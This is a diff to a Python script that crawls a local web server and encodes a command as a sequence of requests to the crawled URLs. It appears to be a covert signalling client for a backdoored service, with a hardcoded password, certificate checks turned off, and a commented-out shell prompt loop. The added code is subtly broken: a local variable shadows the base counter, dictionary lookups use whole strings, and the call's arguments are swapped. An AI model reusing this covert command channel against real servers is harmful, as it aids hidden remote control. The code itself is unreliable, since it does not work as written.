@@ -2,11 +2,23 @@ from urlparse import urlparse
 import requests , os , re
 
 checked_urls = set()
+n = 0  # which base it will be
+convertString = "0123456789abcdefghijklmnopqrstuvwxyz" # remember strtol
+base_dict = {}
+
+# from http://interactivepython.org/courselib/static/pythonds/Recursion/pythondsConvertinganIntegertoaStringinAnyBase.html
+def toStr(c):
+	if type(c) == str :
+		c = ord(c)
+	if c < n:
+		return convertString[c]
+	else:
+		return toStr(c//n) + convertString[c%n]
 
 # ripped from LinkFinder
 def send_request(url):
     '''
-    Send requests with Requests
+    Send requests with Requests, duh
     '''
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
@@ -19,6 +31,20 @@ def send_request(url):
 
     content = requests.get(url, headers=headers, timeout=1, stream=True, verify=False)
     return content
+
+def send_encoded(command,url) :
+	for c in command :
+		c = toStr(c)
+		for x in c :
+			send_request(url+base_dict[c])
+
+		send_request(url) # EOC, End Of Character
+
+	eof = toStr(0x0a)
+	for x in eof :
+		send_request(url+base_dict[x])
+
+	send_request(url)
 
 # ripped from LinkFinder
 def spider(url,path) :
@@ -68,10 +94,21 @@ def spider(url,path) :
 def main() :
 	URL = "http://localhost:8080"	
 	PATH  = ""
+	password = "4ll1g4t0r5uX"
+
 	spider(URL,PATH)
 
-	for l in checked_urls :
-		print l
+	checked_urls_list = list(checked_urls)
+	checked_urls_list.sort() 
+
+	n = len(checked_urls_list)
+
+	for i in range(n) :
+		base_dict[convertString[i]] = checked_urls_list[i]
+
+	send_encoded(URL,password)
+
+	print base_dict
 
 	#while(1) :
 	#	c = input('$ ')
